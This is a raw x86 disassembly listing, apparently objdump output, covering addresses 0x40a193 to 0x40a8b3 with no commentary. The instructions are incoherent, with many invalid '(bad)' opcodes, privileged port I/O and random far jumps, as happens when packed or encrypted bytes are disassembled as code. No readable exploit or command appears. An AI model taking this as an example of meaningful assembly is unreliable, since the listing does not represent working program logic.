  40a193:	mov    ?,WORD PTR [edi]
  40a195:	jecxz  0x40a207
  40a197:	out    dx,eax
  40a198:	clc    
  40a199:	xchg   esp,eax
  40a19a:	cdq    
  40a19b:	or     eax,0xf59e382a
  40a1a0:	inc    edx
  40a1a1:	dec    ebp
  40a1a2:	imul   edi,DWORD PTR [ebp+0x68],0x30
  40a1a6:	or     BYTE PTR [ecx+0x2f9695e5],ch
  40a1ac:	and    bl,dl
  40a1ae:	cmc    
  40a1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b0:	out    0xb2,eax
  40a1b2:	inc    ebx
  40a1b3:	sbb    ebx,DWORD PTR [edx+0x62]
  40a1b6:	push   ds
  40a1b7:	ins    DWORD PTR es:[edi],dx
  40a1b8:	in     al,dx
  40a1b9:	fstp   TBYTE PTR [edi]
  40a1bb:	mov    BYTE PTR [ecx],al
  40a1bd:	cld    
  40a1be:	sar    BYTE PTR [ebx-0x65],cl
  40a1c1:	scas   al,BYTE PTR es:[edi]
  40a1c2:	mov    dh,BYTE PTR [esi-0x6d]
  40a1c5:	rcl    DWORD PTR [ebx+0x3d515402],1
  40a1cb:	repnz inc esi
  40a1cd:	(bad)  
  40a1ce:	(bad)  
  40a1cf:	cmc    
  40a1d0:	add    dh,BYTE PTR [eax+0x2aa552aa]
  40a1d6:	out    dx,eax
  40a1d7:	jno    0x40a1d3
  40a1d9:	push   ss
  40a1da:	ins    DWORD PTR es:[edi],dx
  40a1db:	or     BYTE PTR [edi-0x18],dl
  40a1de:	ds jnp 0x40a18b
  40a1e1:	mov    ebx,0x26930f6c
  40a1e6:	dec    ebx
  40a1e7:	out    0x54,eax
  40a1e9:	popa   
  40a1ea:	(bad)  
  40a1eb:	push   ds
  40a1ec:	dec    ecx
  40a1ed:	clc    
  40a1ee:	std    
  40a1ef:	fwait
  40a1f0:	sbb    eax,0x7cb7933e
  40a1f5:	dec    ebp
  40a1f6:	lds    edx,FWORD PTR [edi+eax*2+0x7cb51227]
  40a1fd:	push   edx
  40a1fe:	add    DWORD PTR [edi+0x4f],edx
  40a201:	int3   
  40a202:	cli    
  40a203:	inc    ebp
  40a204:	inc    edx
  40a205:	jnp    0x40a20b
  40a207:	dec    ebx
  40a208:	aas    
  40a209:	das    
  40a20a:	jns    0x40a1f8
  40a20c:	fcomp  DWORD PTR ss:[eax-0x5433c442]
  40a213:	mov    edi,ds
  40a215:	lods   al,BYTE PTR ds:[esi]
  40a216:	lock cmp edi,DWORD PTR [edx-0x6f3fb853]
  40a21d:	xchg   ebx,eax
  40a21e:	pop    esp
  40a21f:	xlat   BYTE PTR ds:[ebx]
  40a220:	xchg   edi,eax
  40a221:	mov    dh,0xde
  40a223:	and    BYTE PTR [ebp+0x7eef4739],ah
  40a229:	push   cs
  40a22a:	cwde   
  40a22b:	stos   DWORD PTR es:[edi],eax
  40a22c:	inc    edi
  40a22d:	mov    ecx,0x4446f243
  40a232:	les    esi,FWORD PTR [edi-0x65]
  40a235:	scas   al,BYTE PTR es:[edi]
  40a236:	loope  0x40a290
  40a238:	dec    ebx
  40a239:	fdivr  st(0),st
  40a23b:	and    ebp,DWORD PTR [ebx+edx*8+0x6]
  40a23f:	xor    dh,al
  40a241:	push   ss
  40a242:	sbb    ebp,esi
  40a244:	add    ebx,DWORD PTR [ecx]
  40a246:	(bad)  
  40a247:	ins    DWORD PTR es:[edi],dx
  40a248:	add    bh,BYTE PTR [ebp+0x24f9f5f3]
  40a24e:	cmp    esi,DWORD PTR [ecx+0x1295078f]
  40a254:	bound  ebp,QWORD PTR [esi+0x5dcc1ac6]
  40a25a:	push   ebx
  40a25b:	retf   0x607a
  40a25e:	mov    eax,ds:0x4802fd4c
  40a263:	sub    al,cl
  40a265:	push   ss
  40a266:	jmp    0xb2e45f7e
  40a26b:	push   esp
  40a26c:	stos   DWORD PTR es:[edi],eax
  40a26d:	inc    esp
  40a26e:	inc    esi
  40a26f:	(bad)  
  40a270:	mov    BYTE PTR [esi-0x750db0d6],ah
  40a276:	rcr    DWORD PTR [edx+0x16],0x63
  40a27a:	sub    cl,BYTE PTR [edx]
  40a27c:	mov    ch,0x8
  40a27e:	or     ebx,DWORD PTR ds:0x36e8a630
  40a284:	std    
  40a285:	xchg   esp,eax
  40a286:	int3   
  40a287:	popa   
  40a288:	lds    esp,FWORD PTR [eax+0x436d89e]
  40a28e:	lock push es
  40a290:	pop    es
  40a291:	ss push ds
  40a293:	dec    eax
  40a294:	fwait
  40a295:	outs   dx,BYTE PTR ds:[esi]
  40a296:	dec    edi
  40a297:	dec    edi
  40a298:	rol    ah,0x26
  40a29b:	jnp    0x40a280
  40a29d:	repnz aas 
  40a29f:	lods   eax,DWORD PTR ds:[esi]
  40a2a0:	dec    edx
  40a2a1:	imul   ebx,DWORD PTR [ebx+0x165d44a],0x57
  40a2a8:	xor    ebx,DWORD PTR [ebx+0xa1a8574]
  40a2ae:	xchg   esi,eax
  40a2af:	and    BYTE PTR [edi-0x7ef7b7a9],ch
  40a2b5:	push   esp
  40a2b6:	rol    edx,cl
  40a2b8:	(bad)  
  40a2b9:	mov    dh,0x37
  40a2bb:	jnp    0x40a2c0
  40a2bd:	sbb    eax,0xe8e3ddb1
  40a2c2:	cmp    BYTE PTR [ecx-0x62],dl
  40a2c5:	scas   eax,DWORD PTR es:[edi]
  40a2c6:	fwait
  40a2c7:	ret    
  40a2c8:	(bad)  
  40a2c9:	loop   0x40a296
  40a2cb:	jae    0x40a2fd
  40a2cd:	mov    esp,0x6b4e260a
  40a2d2:	ins    BYTE PTR es:[edi],dx
  40a2d3:	scas   al,BYTE PTR es:[edi]
  40a2d4:	xchg   esi,eax
  40a2d5:	aaa    
  40a2d6:	add    DWORD PTR [ebx],0x3e940447
  40a2dc:	stc    
  40a2dd:	push   cs
  40a2de:	stos   BYTE PTR es:[edi],al
  40a2df:	mov    al,BYTE PTR [esi+0x73beb854]
  40a2e5:	lods   eax,DWORD PTR ds:[esi]
  40a2e6:	fdivr  DWORD PTR [ebp+0x4741269e]
  40a2ec:	ror    DWORD PTR [edx+0x17f55f38],0x58
  40a2f3:	dec    esp
  40a2f4:	sub    DWORD PTR [edi-0x3e],eax
  40a2f7:	jne    0x40a27a
  40a2f9:	inc    eax
  40a2fa:	xchg   esi,eax
  40a2fb:	mov    WORD PTR [ebp+0x2d],ss
  40a2fe:	dec    ecx
  40a2ff:	cmp    ah,BYTE PTR [ebx]
  40a301:	nop
  40a302:	or     DWORD PTR [edi+0x28],0xc4d0de2e
  40a309:	stc    
  40a30a:	std    
  40a30b:	(bad)  
  40a30c:	aas    
  40a30d:	loopne 0x40a2b0
  40a30f:	jns    0x40a383
  40a311:	arpl   WORD PTR [esi+0x12],cx
  40a314:	mov    ?,eax
  40a316:	cs int 0xdd
  40a319:	mov    ss,WORD PTR [edi+ebp*8-0x4c]
  40a31d:	sub    esi,DWORD PTR [edi]
  40a31f:	dec    ebx
  40a320:	in     al,dx
  40a321:	jo     0x40a385
  40a323:	mov    ebx,0x797e36a7
  40a328:	pop    es
  40a329:	fwait
  40a32a:	cmp    dh,BYTE PTR [eax+0x73]
  40a32d:	inc    ebx
  40a32e:	mov    cl,0xd3
  40a330:	dec    edx
  40a331:	jbe    0x40a33c
  40a333:	and    bl,BYTE PTR [eax+0x78]
  40a336:	in     al,0xa8
  40a338:	retf   
  40a339:	xchg   ecx,eax
  40a33a:	mov    dl,0x39
  40a33c:	outs   dx,BYTE PTR ds:[esi]
  40a33d:	or     DWORD PTR [edi-0x286a11bf],ebx
  40a343:	mov    dl,0xee
  40a345:	xchg   edx,eax
  40a346:	fdiv   DWORD PTR [ebx]
  40a348:	jl     0x40a317
  40a34a:	inc    ebp
  40a34b:	dec    esi
  40a34c:	in     al,0x58
  40a34e:	nop
  40a34f:	push   cs
  40a350:	jmp    0x68d8:0xf0f31a5a
  40a357:	sti    
  40a358:	push   ecx
  40a359:	(bad)  
  40a35a:	push   ss
  40a35b:	rcl    edx,0xba
  40a35e:	inc    esp
  40a35f:	(bad)  
  40a360:	jnp    0x40a2f9
  40a362:	int3   
  40a363:	(bad)  
  40a364:	mov    ds:0x719013cc,eax
  40a369:	loope  0x40a30c
  40a36b:	xchg   bh,ch
  40a36d:	cmp    dl,al
  40a36f:	jl     0x40a31d
  40a371:	(bad)  
  40a372:	(bad)  [ecx+0x33baa527]
  40a378:	mov    al,ds:0x4b95f45c
  40a37d:	lds    edi,FWORD PTR [bp-0x2ff]
  40a382:	inc    ebx
  40a383:	adc    al,0x4f
  40a385:	mov    ah,0x61
  40a387:	jmp    0x40a31a
  40a389:	into   
  40a38a:	push   es
  40a38b:	xor    DWORD PTR [eax-0x55535648],edx
  40a391:	inc    esi
  40a392:	pop    ebp
  40a393:	std    
  40a394:	mov    dl,0xe6
  40a396:	push   cs
  40a397:	or     eax,0x63365556
  40a39c:	mov    dh,0xa8
  40a39e:	pusha  
  40a39f:	in     al,dx
  40a3a0:	daa    
  40a3a1:	js     0x40a3bf
  40a3a3:	and    dl,al
  40a3a5:	push   es
  40a3a6:	jno    0x40a38b
  40a3a8:	(bad)  
  40a3a9:	fsub   st(1),st
  40a3ab:	js     0x40a331
  40a3ad:	mov    BYTE PTR [ebp-0xe],0xdd
  40a3b1:	dec    esp
  40a3b2:	add    eax,ecx
  40a3b4:	push   esi
  40a3b5:	jg     0x40a416
  40a3b7:	popa   
  40a3b8:	stc    
  40a3b9:	outs   dx,BYTE PTR ds:[esi]
  40a3ba:	mov    ecx,0x21b8d5ee
  40a3bf:	jl     0x40a38a
  40a3c1:	cmp    eax,0xae5eb2aa
  40a3c6:	test   al,0xf4
  40a3c8:	xor    DWORD PTR [ecx+0x58637256],ebp
  40a3ce:	jmp    0x881b:0x9525602
  40a3d5:	lods   eax,DWORD PTR ds:[esi]
  40a3d6:	mov    ch,0xe6
  40a3d8:	fild   WORD PTR [edi]
  40a3da:	mov    ds:0x286f2d12,al
  40a3df:	popf   
  40a3e0:	inc    edx
  40a3e1:	xchg   dh,dl
  40a3e3:	inc    ebp
  40a3e4:	and    DWORD PTR [eax],0xba5edb2c
  40a3ea:	test   BYTE PTR [ecx],ch
  40a3ec:	dec    esi
  40a3ed:	sub    bl,BYTE PTR [esi+0x70d43a0b]
  40a3f3:	shr    DWORD PTR [ecx+0x53],1
  40a3f6:	mov    al,ds:0x125ec156
  40a3fb:	jg     0x40a3ab
  40a3fd:	add    edx,DWORD PTR [eax]
  40a3ff:	shr    BYTE PTR [edx],1
  40a401:	fisub  DWORD PTR [esi+eiz*2]
  40a404:	scas   eax,DWORD PTR es:[edi]
  40a405:	pusha  
  40a406:	int3   
  40a407:	(bad)
  40a40b:	push   ebp
  40a40c:	pop    ss
  40a40d:	scas   eax,DWORD PTR es:[edi]
  40a40e:	jmp    0x40a433
  40a410:	pop    ebp
  40a411:	or     esp,edi
  40a413:	cs inc edi
  40a415:	fwait
  40a416:	inc    esp
  40a417:	addr16 out dx,eax
  40a419:	adc    bh,BYTE PTR [ebp-0x2c]
  40a41c:	jb     0x40a420
  40a41e:	scas   eax,DWORD PTR es:[edi]
  40a41f:	pop    eax
  40a420:	aam    0x6d
  40a422:	js     0x40a3b7
  40a424:	(bad)  
  40a425:	repz fstp TBYTE PTR [edi+0x69]
  40a429:	lahf   
  40a42a:	or     al,0x67
  40a42c:	into   
  40a42d:	or     DWORD PTR [esi-0x23],ebx
  40a430:	pop    ebx
  40a431:	inc    eax
  40a432:	pop    esi
  40a433:	stc    
  40a434:	jno    0x40a413
  40a436:	adc    edx,DWORD PTR [ebx-0xa]
  40a439:	jb     0x40a48a
  40a43b:	push   0x37281038
  40a440:	sar    DWORD PTR [ebp-0x51],cl
  40a443:	rcr    DWORD PTR [edx],0xcb
  40a446:	fisttp DWORD PTR [esi+0x432b54f3]
  40a44c:	xor    eax,DWORD PTR [esi]
  40a44e:	clc    
  40a44f:	and    ebp,ebp
  40a451:	mov    esp,0x9cac3e40
  40a456:	scas   eax,DWORD PTR es:[edi]
  40a457:	mov    dh,ch
  40a459:	sti    
  40a45a:	push   eax
  40a45b:	mov    cl,0x90
  40a45d:	fild   DWORD PTR [ebx+0x9]
  40a460:	jns    0x40a3ff
  40a462:	ds fwait
  40a464:	xchg   esp,eax
  40a465:	leave  
  40a466:	mov    ds:0x65bfeb02,al
  40a46b:	dec    ebp
  40a46c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a46d:	test   al,0x42
  40a46f:	stos   DWORD PTR es:[edi],eax
  40a470:	sbb    DWORD PTR [edx],esp
  40a472:	call   0xb926:0xefc5011
  40a479:	popa   
  40a47a:	adc    BYTE PTR [ecx-0x69],ah
  40a47d:	aas    
  40a47e:	loop   0x40a406
  40a480:	sbb    esi,DWORD PTR [eax+0x76]
  40a483:	push   edx
  40a484:	mov    al,0x18
  40a486:	adc    BYTE PTR [ebx-0x35],cl
  40a489:	ins    DWORD PTR es:[edi],dx
  40a48a:	sbb    ecx,ecx
  40a48c:	adc    BYTE PTR [edi-0x2e],0xdd
  40a490:	jp     0x40a4dc
  40a492:	and    bl,BYTE PTR [edx+0x50cbe082]
  40a498:	mov    eax,ds:0x38518927
  40a49d:	and    eax,0x837f8586
  40a4a2:	jecxz  0x40a469
  40a4a4:	inc    edx
  40a4a5:	jmp    0x40a482
  40a4a7:	cs std 
  40a4a9:	jae    0x40a43d
  40a4ab:	rol    eax,cl
  40a4ad:	cwde   
  40a4ae:	icebp  
  40a4af:	aas    
  40a4b0:	je     0x40a4dd
  40a4b2:	or     al,0x84
  40a4b4:	loop   0x40a506
  40a4b6:	(bad)  
  40a4b7:	push   ss
  40a4b8:	aas    
  40a4b9:	xor    BYTE PTR [edi+edi*2-0x1f3be233],dh
  40a4c0:	cmp    bh,al
  40a4c2:	jns    0x40a535
  40a4c4:	rcl    DWORD PTR [ebp+0x1],cl
  40a4c7:	mov    dl,0x34
  40a4c9:	imul   edi,DWORD PTR [edx],0x19
  40a4cc:	imul   ecx,DWORD PTR [edx-0x1b766603],0xffffffc8
  40a4d3:	(bad)  
  40a4d4:	dec    esi
  40a4d5:	or     al,0x2a
  40a4d7:	inc    ecx
  40a4d8:	shr    DWORD PTR [ebp+0x1afc2900],0xbd
  40a4df:	xchg   ebx,eax
  40a4e0:	mov    al,0x32
  40a4e2:	daa    
  40a4e3:	retf   
  40a4e4:	and    al,0x89
  40a4e6:	cmp    al,0x4d
  40a4e8:	scas   al,BYTE PTR es:[edi]
  40a4e9:	(bad)  
  40a4ea:	sub    cl,BYTE PTR [ecx+0x5c]
  40a4ed:	add    eax,0x11e3ea70
  40a4f2:	xchg   ebx,eax
  40a4f3:	ret    0x6736
  40a4f6:	sbb    esi,edx
  40a4f8:	xlat   BYTE PTR ds:[ebx]
  40a4f9:	sbb    DWORD PTR es:[ebx],ebp
  40a4fc:	ror    DWORD PTR [ebp+0x7],1
  40a4ff:	mov    edx,0xd620512b
  40a504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a505:	sub    al,0x11
  40a507:	jmp    0x40a560
  40a509:	lods   al,BYTE PTR ds:[esi]
  40a50a:	(bad)  
  40a50b:	data16 fsubr DWORD PTR [ebx]
  40a50e:	rcl    BYTE PTR [ebx-0x5023b88e],0x4
  40a515:	inc    edx
  40a516:	push   ebx
  40a517:	addr16 or edx,esp
  40a51a:	ins    DWORD PTR es:[edi],dx
  40a51b:	(bad)  
  40a51c:	dec    edx
  40a51d:	or     al,0x4e
  40a51f:	enter  0x3b36,0x9d
  40a523:	into   
  40a524:	sar    ebp,1
  40a526:	inc    esi
  40a527:	ins    BYTE PTR es:[edi],dx
  40a528:	lahf   
  40a529:	dec    esi
  40a52a:	stos   BYTE PTR es:[edi],al
  40a52b:	jmp    0x6773:0x6e3094a4
  40a532:	cmp    DWORD PTR [esi-0x52e4ed3d],0xffffff83
  40a539:	adc    DWORD PTR [edx+edi*4+0x64],edi
  40a53d:	fiadd  WORD PTR [eax]
  40a53f:	xor    bl,BYTE PTR [ecx-0x5a]
  40a542:	mov    BYTE PTR ds:0xf6c08122,cl
  40a548:	sbb    ebx,DWORD PTR [eax-0x26c3db81]
  40a54e:	je     0x40a4e6
  40a550:	(bad)  
  40a551:	jp     0x40a571
  40a553:	and    bh,BYTE PTR [esi+ebp*1]
  40a556:	push   esp
  40a557:	adc    eax,0xed180f4e
  40a55c:	xlat   BYTE PTR ds:[ebx]
  40a55d:	cmp    ecx,ecx
  40a55f:	lods   al,BYTE PTR cs:[esi]
  40a561:	mov    bl,0xab
  40a563:	xchg   edx,eax
  40a564:	shr    ah,0x41
  40a567:	inc    esi
  40a568:	or     DWORD PTR [edi],eax
  40a56a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a56b:	dec    edx
  40a56c:	es jl  0x40a5b0
  40a56f:	rcr    DWORD PTR [edx],1
  40a571:	sbb    DWORD PTR [edi],edx
  40a573:	push   0x5b76e585
  40a578:	sub    eax,0x2a109ea0
  40a57d:	adc    ecx,esi
  40a57f:	dec    ebp
  40a580:	aas    
  40a581:	mov    ah,0xbf
  40a583:	mov    edx,0xf329b0c5
  40a588:	mov    ah,0x2
  40a58a:	or     eax,0xc0926ad4
  40a58f:	adc    eax,0x9a4dde5
  40a594:	mov    bh,0x87
  40a596:	xchg   edx,eax
  40a597:	xchg   DWORD PTR [ecx-0x24],edx
  40a59a:	sbb    BYTE PTR ds:0xeb757553,dl
  40a5a0:	pop    eax
  40a5a1:	push   ebp
  40a5a2:	cmp    eax,0x70e64ce1
  40a5a7:	fwait
  40a5a8:	xor    al,BYTE PTR [esp+edi*1+0x6c]
  40a5ac:	or     eax,DWORD PTR [esi+0x1bd67e1f]
  40a5b2:	icebp  
  40a5b3:	mov    fs,WORD PTR [eax-0x2a2984df]
  40a5b9:	dec    ebp
  40a5ba:	jp     0x40a53f
  40a5bc:	imul   esi,DWORD PTR [eax],0xffffffb6
  40a5bf:	pop    eax
  40a5c0:	inc    edi
  40a5c1:	ds imul esi,esp,0xb
  40a5c5:	jmp    0x68d:0xf9e3ed60
  40a5cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5cd:	mov    ebp,0x201f3f10
  40a5d2:	mov    edx,0x6c8ff812
  40a5d7:	xor    al,0x39
  40a5d9:	inc    esi
  40a5da:	mov    dl,0x4c
  40a5dc:	aas    
  40a5dd:	push   eax
  40a5de:	clc    
  40a5df:	jbe    0x40a649
  40a5e1:	or     al,0x3
  40a5e3:	and    DWORD PTR [ecx],esi
  40a5e5:	mov    edx,0x911a578d
  40a5ea:	stos   BYTE PTR es:[edi],al
  40a5eb:	xchg   esp,eax
  40a5ec:	or     eax,0xb70236f2
  40a5f1:	out    dx,al
  40a5f2:	and    BYTE PTR [eax-0x1c],0xd9
  40a5f6:	std    
  40a5f7:	(bad)  
  40a5f8:	in     eax,dx
  40a5f9:	pop    ebx
  40a5fa:	push   edx
  40a5fb:	test   eax,0xe826d77c
  40a600:	(bad)  
  40a601:	icebp  
  40a602:	aad    0xd
  40a604:	xor    BYTE PTR [eax-0x2d],cl
  40a607:	ss sub eax,0x9f0861b5
  40a60d:	xlat   BYTE PTR ds:[ebx]
  40a60e:	jle    0x40a64f
  40a610:	std    
  40a611:	xor    eax,0x580b5243
  40a616:	or     DWORD PTR [ebp-0x6b0d28c1],0x46cd6961
  40a620:	cmp    eax,0xd7c21ac0
  40a625:	cmp    al,BYTE PTR [edx+edx*8]
  40a628:	pushf  
  40a629:	ficomp WORD PTR [ebx-0x57c0c7e2]
  40a62f:	and    al,0xed
  40a631:	(bad)  
  40a632:	ror    BYTE PTR [edx],1
  40a634:	push   0x8245cdc7
  40a639:	sbb    al,0x26
  40a63b:	stc    
  40a63c:	fld    QWORD PTR [ebx-0x69]
  40a63f:	out    0xd0,eax
  40a641:	or     esi,ebp
  40a643:	and    DWORD PTR [ebp+0x5243303d],esi
  40a649:	and    eax,0x2acda945
  40a64e:	jae    0x40a65a
  40a650:	mov    edx,0xaaf50129
  40a655:	aaa    
  40a656:	xor    eax,0x84af6725
  40a65b:	jmp    0x2f8d:0x7a8edaf5
  40a662:	stos   DWORD PTR es:[edi],eax
  40a663:	adc    dh,BYTE PTR [edi+ebx*1+0x6b]
  40a667:	sahf   
  40a668:	mov    cs:0x904581a3,al
  40a66e:	aam    0xda
  40a670:	cli    
  40a671:	add    DWORD PTR [eax+eiz*4+0x6dd2d1bb],ecx
  40a678:	sbb    DWORD PTR [ebx+0x374a73c2],0x4be328f1
  40a682:	pop    esp
  40a683:	(bad)  
  40a684:	popa   
  40a685:	js     0x40a698
  40a687:	daa    
  40a688:	out    dx,al
  40a689:	int    0x4d
  40a68b:	test   al,0xbf
  40a68d:	xchg   esp,eax
  40a68e:	into   
  40a68f:	fnsave [edi+edx*4]
  40a692:	jae    0x40a711
  40a694:	push   ss
  40a695:	mov    dl,0x9c
  40a697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a698:	out    dx,eax
  40a699:	outs   dx,BYTE PTR ds:[esi]
  40a69a:	or     edx,DWORD PTR [ebx-0x6339fd6b]
  40a6a0:	mov    esp,0x8bbe8ad7
  40a6a5:	aam    0xd0
  40a6a7:	outs   dx,BYTE PTR ds:[esi]
  40a6a8:	jne    0x40a698
  40a6aa:	lods   al,BYTE PTR ds:[esi]
  40a6ab:	retf   0xdf16
  40a6ae:	mov    BYTE PTR [edi],bl
  40a6b0:	outs   dx,BYTE PTR ds:[esi]
  40a6b1:	inc    eax
  40a6b2:	or     dl,BYTE PTR cs:[eax+ebp*8]
  40a6b6:	dec    ecx
  40a6b7:	fisttp WORD PTR [ebx]
  40a6b9:	dec    edx
  40a6ba:	inc    esi
  40a6bb:	outs   dx,BYTE PTR ds:[esi]
  40a6bc:	cs aaa 
  40a6be:	aam    0x61
  40a6c0:	pop    eax
  40a6c1:	(bad)  
  40a6c2:	int    0x4c
  40a6c4:	loop   0x40a65c
  40a6c6:	scas   al,BYTE PTR es:[edi]
  40a6c7:	pop    eax
  40a6c8:	rcr    ecx,cl
  40a6ca:	fwait
  40a6cb:	inc    esi
  40a6cc:	sbb    edx,DWORD PTR [bx+0x30]
  40a6d0:	cmc    
  40a6d1:	lods   al,BYTE PTR ds:[esi]
  40a6d2:	stos   BYTE PTR es:[edi],al
  40a6d3:	adc    esp,DWORD PTR [esi]
  40a6d5:	ds pop ebx
  40a6d7:	inc    edi
  40a6d8:	call   0x580:0xf1b82b57
  40a6df:	jmp    0x1577:0xd7472a0
  40a6e6:	sbb    al,BYTE PTR [edi-0x1af42911]
  40a6ec:	lock sub esp,DWORD PTR [edi+0x19e2e45c]
  40a6f3:	mov    bl,0x92
  40a6f5:	pop    ebx
  40a6f6:	jl     0x40a721
  40a6f8:	jno    0x40a768
  40a6fa:	out    0xb9,al
  40a6fc:	cmp    BYTE PTR [eax+0x22457e42],ch
  40a702:	or     BYTE PTR [edx],al
  40a704:	retf   
  40a705:	stc    
  40a706:	sub    DWORD PTR [ebx],esi
  40a708:	jmp    0xb826:0x7804f131
  40a70f:	add    DWORD PTR [ebp-0x57],ecx
  40a712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a713:	push   ebx
  40a714:	jmp    0xd6fbd5d
  40a719:	cvtps2pd xmm2,xmm2
  40a71c:	pop    edi
  40a71d:	out    0xac,eax
  40a71f:	sub    eax,0x63bc1dcd
  40a724:	outs   dx,BYTE PTR ds:[esi]
  40a725:	sar    BYTE PTR [ebp-0x7533ee75],0xf7
  40a72c:	adc    eax,0xb97c9d4d
  40a731:	cmc    
  40a732:	xchg   DWORD PTR [ebp+0x35dba6c9],edx
  40a738:	cwde   
  40a739:	stc    
  40a73a:	aas    
  40a73b:	push   esp
  40a73c:	and    al,0xd6
  40a73e:	shl    esp,0x59
  40a741:	jmp    0x40a757
  40a743:	test   eax,0x1963a257
  40a748:	push   0x85919398
  40a74d:	inc    edi
  40a74e:	mov    ebx,0xb12c3d85
  40a753:	push   ds
  40a754:	mov    WORD PTR ds:0x5509e220,es
  40a75a:	and    BYTE PTR [edi+0x1fe2a507],bh
  40a760:	sti    
  40a761:	inc    eax
  40a762:	mov    WORD PTR [ebx+0x2b],ds
  40a765:	mov    WORD PTR [ecx+ebx*1-0x1e],cs
  40a769:	jbe    0x40a790
  40a76b:	mov    cl,0x1c
  40a76d:	ins    BYTE PTR es:[edi],dx
  40a76e:	out    0xd5,eax
  40a770:	xchg   BYTE PTR [ecx+0x73659d0],al
  40a776:	xor    edi,DWORD PTR [edi]
  40a778:	mov    dl,0xfa
  40a77a:	adc    edi,DWORD PTR [ecx]
  40a77c:	outs   dx,BYTE PTR ds:[esi]
  40a77d:	xor    BYTE PTR [ecx+0x49],bl
  40a780:	or     BYTE PTR [edi+esi*4+0xe],0x78
  40a785:	xor    edi,edi
  40a787:	rcr    DWORD PTR [ecx-0x74],0xb0
  40a78b:	pop    ebp
  40a78c:	cmp    eax,0xdcaef9fc
  40a791:	jle    0x40a756
  40a793:	aaa    
  40a794:	jne    0x40a71d
  40a796:	and    eax,0xebe5e93d
  40a79b:	lds    esp,FWORD PTR [esi-0x1b958724]
  40a7a1:	inc    ebx
  40a7a2:	jb     0x40a822
  40a7a4:	ss in  eax,0xba
  40a7a7:	pushf  
  40a7a8:	outs   dx,DWORD PTR ds:[esi]
  40a7a9:	loopne 0x40a7f2
  40a7ab:	ds pop ecx
  40a7ad:	push   edi
  40a7ae:	mov    ebp,0x5b5dbb43
  40a7b3:	mov    dh,0x62
  40a7b5:	cmp    bl,cl
  40a7b7:	mov    al,0x25
  40a7b9:	es and al,dl
  40a7bc:	push   ds
  40a7bd:	std    
  40a7be:	pop    ds
  40a7bf:	xlat   BYTE PTR ds:[ebx]
  40a7c0:	arpl   WORD PTR [ebp-0x2f8f6894],ax
  40a7c6:	mov    edi,0x55dbe67f
  40a7cb:	cmp    dh,al
  40a7cd:	push   edi
  40a7ce:	sub    al,0x5e
  40a7d0:	inc    eax
  40a7d1:	aas    
  40a7d2:	iret   
  40a7d3:	cmp    bl,cl
  40a7d5:	mov    bh,bh
  40a7d7:	retf   0x4c7d
  40a7da:	mov    dh,0x6c
  40a7dc:	icebp  
  40a7dd:	lea    ebp,[ecx]
  40a7df:	pop    ebx
  40a7e0:	mov    ebx,0x7974daaa
  40a7e5:	xor    al,0x9d
  40a7e7:	jl     0x40a788
  40a7e9:	shl    BYTE PTR [edx-0x25],1
  40a7ec:	lods   al,BYTE PTR ds:[esi]
  40a7ed:	sbb    dl,BYTE PTR ds:[eax+0x4701e2af]
  40a7f4:	jmp    0xe2bf057f
  40a7f9:	pop    ecx
  40a7fa:	mov    ah,0x7d
  40a7fc:	adc    esp,DWORD PTR [ecx-0x6]
  40a7ff:	call   0xcdfdc830
  40a804:	and    dh,BYTE PTR [esi+0x7]
  40a807:	pushf  
  40a808:	in     al,0x63
  40a80a:	sbb    BYTE PTR [edi+0x5c],al
  40a80d:	xchg   edi,eax
  40a80e:	push   cs
  40a80f:	(bad)  
  40a810:	mov    es,WORD PTR [ecx-0x5d]
  40a813:	loope  0x40a7f8
  40a815:	cmp    DWORD PTR [eax-0x78be8b54],edx
  40a81b:	outs   dx,DWORD PTR ds:[esi]
  40a81c:	out    0x8b,al
  40a81e:	sbb    edi,DWORD PTR [ecx]
  40a820:	pop    ecx
  40a821:	pop    es
  40a822:	add    BYTE PTR ds:0xa5ee6b95,ch
  40a828:	adc    DWORD PTR [ecx+0x6bc97f00],esp
  40a82e:	scas   al,BYTE PTR es:[edi]
  40a82f:	popf   
  40a830:	hlt    
  40a831:	cdq    
  40a832:	jecxz  0x40a7d6
  40a834:	push   cs
  40a835:	jns    0x40a802
  40a837:	push   ebp
  40a838:	and    al,0x7a
  40a83a:	cmc    
  40a83b:	ss mov bl,0x27
  40a83e:	sbb    DWORD PTR [edx+0x41],edx
  40a841:	mov    ch,0xfd
  40a843:	and    dh,BYTE PTR [esi]
  40a845:	sbb    eax,0x7dc4e642
  40a84a:	nop
  40a84b:	(bad)
  40a850:	push   edi
  40a851:	scas   al,BYTE PTR es:[edi]
  40a852:	lods   eax,DWORD PTR ds:[esi]
  40a853:	call   0xe87a:0x3cd99d5b
  40a85a:	pushf  
  40a85b:	popa   
  40a85c:	mov    eax,ds:0x6343ec8a
  40a861:	pop    edi
  40a862:	jbe    0x40a8b5
  40a864:	subps  xmm7,XMMWORD PTR [edi-0x2dc0f644]
  40a86b:	daa    
  40a86c:	cmp    ecx,DWORD PTR [edi-0x48]
  40a86f:	lea    esp,[esi-0x10647b6]
  40a875:	pop    esi
  40a876:	xor    al,0x85
  40a878:	inc    esp
  40a879:	cld    
  40a87a:	outs   dx,BYTE PTR ds:[esi]
  40a87b:	add    BYTE PTR [edx],cl
  40a87d:	cld    
  40a87e:	clc    
  40a87f:	mov    cl,0x35
  40a881:	jle    0x40a80d
  40a883:	mov    ah,0x98
  40a885:	cmovs  esi,DWORD PTR [edi+ebx*1+0x64]
  40a88a:	icebp  
  40a88b:	adc    edx,ecx
  40a88d:	and    cl,BYTE PTR [ebx-0x28]
  40a890:	xchg   ebp,eax
  40a891:	dec    dl
  40a893:	pop    ebp
  40a894:	ins    DWORD PTR es:[edi],dx
  40a895:	in     al,dx
  40a896:	mov    al,0x5c
  40a898:	inc    edi
  40a899:	pop    ebp
  40a89a:	ficom  WORD PTR gs:[ebx-0x12b3726c]
  40a8a1:	sub    eax,0xc98e3c9c
  40a8a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a7:	or     ch,BYTE PTR ds:0x193af362
  40a8ad:	sub    esp,0xfffffff7
  40a8b0:	cs cmp ah,dh
  40a8b3:	fwait
